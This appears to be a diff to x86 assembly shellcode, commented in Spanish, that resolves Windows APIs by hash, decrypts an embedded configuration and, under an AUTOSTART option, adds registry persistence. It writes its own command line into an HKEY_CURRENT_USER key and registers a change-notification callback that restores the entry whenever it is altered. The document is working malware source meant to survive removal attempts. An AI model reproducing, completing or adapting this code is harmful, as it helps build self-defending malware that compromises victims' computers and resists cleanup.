@@ -84,9 +84,9 @@ find_delta:
         D9EC           FLDL2T       MM7-> D49A 784B CD1B 8AFE
         D9ED           FLDPI        MM7-> C90F DAA2 2168 C235
         */
-        fldln2
+		fldln2 //60 DB 14 24 D9 34 24 9C 61 81 EB 
 #ifdef SC_DELTA
-        _EMIT_ARRAY([0xD9, 0x74, 0x24, 0xF4])
+        _EMIT_ARRAY([0xD9, 0x74, 0x24, 0xF4])				//PERDIDA DE STACK (REVISAR)
         pop  edi
         #ifdef SC_NULL
         add  edi, K
@@ -127,7 +127,7 @@ kernel32_symbol_hashes:
         API_DEFINE("ReadFile")
         API_DEFINE("SetFilePointer")
         API_DEFINE("RegisterWaitForSingleObject")
-        API_DEFINE("CreateEventA")
+        API_DEFINE("CreateEventExW")
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    7
@@ -145,12 +145,16 @@ advapi32_symbol_hashes:
         API_DEFINE("CryptSetKeyParam")
         API_DEFINE("CryptImportKey")
         API_DEFINE("CryptDecrypt")
-        API_DEFINE("RegCreateKeyA")
-        API_DEFINE("RegSetValueA")
+        API_DEFINE("RegSetKeyValueW")      
+        API_DEFINE("RegOpenKeyExA")    
         API_DEFINE("RegNotifyChangeKeyValue")
+
 #pragma endregion
 
 #pragma region VARS
+        VAR_DEFINE("RegHandle")
+        VAR_DEFINE("RegCB")
+        VAR_DEFINE("RegWatcher")
         VAR_DEFINE("RegEvent")
         VAR_DEFINE("RegKey")
         VAR_DEFINE("RegPath")
@@ -248,33 +252,53 @@ CreateBuff:
 #ifdef MELT
 SkipQuote:
         cmp BYTE PTR[esi], '"'          //v
-        jne DoNotSkip1                  //v
+        jne DoNotSkip                   //v
         inc  esi                        //v
         inc  esi                        //> Saltamos la primera comilla
 DoNotSkip:
         ret
 #endif //MELT
 #ifdef AUTOSTART
-RegWatch: //VOID CALLBACK WaitOrTimerCallback(_In_  PVOID lpParameter, _In_  BOOLEAN TimerOrWaitFired);
+        RegWatch: //VOID CALLBACK WaitOrTimerCallback(_In_  PVOID lpParameter, _In_  BOOLEAN TimerOrWaitFired);
+        pushad
+		mov  ebp, [esp+0x20+4]			//Obtenemos el puntero a nuestro stack
+        cdq
         push ebp                        //v
         add  DWORD PTR[esp], _RegKey    //v
+        pushc(STANDARD_RIGHTS_READ | KEY_NOTIFY | KEY_SET_VALUE) //v
+        push edx                        //V
         push [ebp+_RegPath]             //v
-        pushc(HKEY_CURRENT_USER)        //v
-        call [ebp+_RegCreateKeyA]       //> RegCreateKeyA(HKEY_CURRENT_USER, &RegPath, &RegKey);
-        //WORKINGHERE
-        call [ebp+_RegSetValueA]        //> RegSetValueA(RegKey, "name", REG_SZ, &MyPath, NULL(ignored));
+        pushc(0x80000001)               //v
+        call [ebp+_RegOpenKeyExA]       //> RegOpenKeyExA(HKEY_CURRENT_USER, &RegPath, NULL, KEY_NOTIFY | KEY_SET_VALUE, &RegKey);
+
+        cdq
+        mov  esi, [ebp+_CommandLine]
+repeat_count:
+        inc  edx
+        lodsw
+        test ax, ax
+        jne repeat_count
+
+        shl  edx, 1
+		push edx
+		push [ebp+_CommandLine]
+		push REG_SZ
+		push [ebp+_pMUTEX]
+        cdq
+        push edx
+		push [ebp+_RegKey]
+        call [ebp+_RegSetKeyValueW]     //> RegSetKeyValueW(RegKey, NULL, " ", REG_SZ, &MyPath, NULL(ignored));
 
         cdq                             //EDX = 0
-        inc  edx                        //EDX = TRUE
-        push edx
-        push [ebp+_RegEvent]
-        push REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_CHANGE_ATTRIBUTES | REG_NOTIFY_CHANGE_LAST_SET | REG_NOTIFY_CHANGE_SECURITY
-        push edx
-        push [ebp+_RegKey]
-        call [ebp+_RegNotifyChangeKeyValue]//> RegNotifyChangeKeyValue(RegKey, TRUE, filter, RegEvent, TRUE);
-
-
-        ret
+        push 1                          //v
+        push [ebp+_RegEvent]            //v
+        push REG_NOTIFY_CHANGE_LAST_SET //v
+        push edx                        //v
+        push [ebp+_RegKey]              //v
+        call [ebp+_RegNotifyChangeKeyValue] //> RegNotifyChangeKeyValue(RegKey, FALSE, REG_NOTIFY_CHANGE_LAST_SET, RegEvent, TRUE);
+        DEBUG_MSG("sREG")
+        popad
+        ret 0x8
 #endif //AUTOSTART
 over_fncs:
         //Saltamos sobre la configuración
@@ -423,6 +447,10 @@ find_kernel32_finished:
         //Creamos un buffer para almacenar la configuración cifrada y luego descifrarla.
         movr(esi, config_start)         //Cargamos la posición del inicio de la config
 
+		pushc(RegWatch)
+		add  [esp], edi
+		pop  dword ptr[ebp+_RegWatcher]
+
         /*###############################################################################
         **        TRAS ESTE PUNTO YA NO NECESITAMOS ALMACENAR EL DELTA (EDI)
         *###############################################################################*/
@@ -452,8 +480,10 @@ xornext:
         mov  [ebp+_pKEY], eax           //
         lea  esi, [eax+0x1C]            //ESI = &mutex
         mov  [ebp+_pMUTEX], esi         //
+#ifdef AUTOSTART
         add  esi, 0x8                   //ESI = &RegPath
         mov  [ebp+_RegPath], esi        //
+#endif
         cdq                             //EDX = 0
 repeat: inc  esi
         mov  dl, BYTE PTR[esi]          //DL  = RegPath[n]
@@ -616,20 +646,27 @@ found:
         **      evento con su callback.
         *###############################################################################*/
 #ifdef AUTOSTART
+        pushc(EVENT_ALL_ACCESS)         //v
+        push 1                          //v
         cdq                             //EDX = 0
         push edx                        //v
         push edx                        //v
-        inc  edx                        //v
-        push edx                        //v
-        dec  edx                        //v
-        push edx                        //v
-        call [ebp+_CreateEventA]        //v
-        mov  [ebp+_RegEvent], eax       //> RegEvent = CreateEventA(NULL, TRUE, FALSE, TRUE);
+        call [ebp+_CreateEventExW]      //v
+        mov[ebp + _RegEvent], eax       //> RegEvent = CreateEventExW(NULL, NULL, CREATE_EVENT_MANUAL_RESET, EVENT_ALL_ACCESS);
 
+        push WT_EXECUTEINWAITTHREAD
+		push INFINITE
+		push ebp
+		push [ebp+_RegWatcher]
+		push [ebp+_RegEvent]
+		push ebp
+		add [esp], _RegCB
+		call [ebp+_RegisterWaitForSingleObject]
+        //> RegisterWaitForSingeObject(&RegEvent, RegEvent, &RegWatch, EBP(stack propio), INFINITE, WT_EXECUTEINWAITTHREAD);
         cdq                             //EDX = 0
-        push 0                          //
-        push 0                          //
-        call RegWatch                   //> Llamamos al callback
+        push edx                        //
+        push ebp                        //
+        call RegWatch                   //> Llamamos al callback manualmente para crear por primera vez si es necesario
 
 #endif //AUTOSTART
         cdq                             //EDX = 0
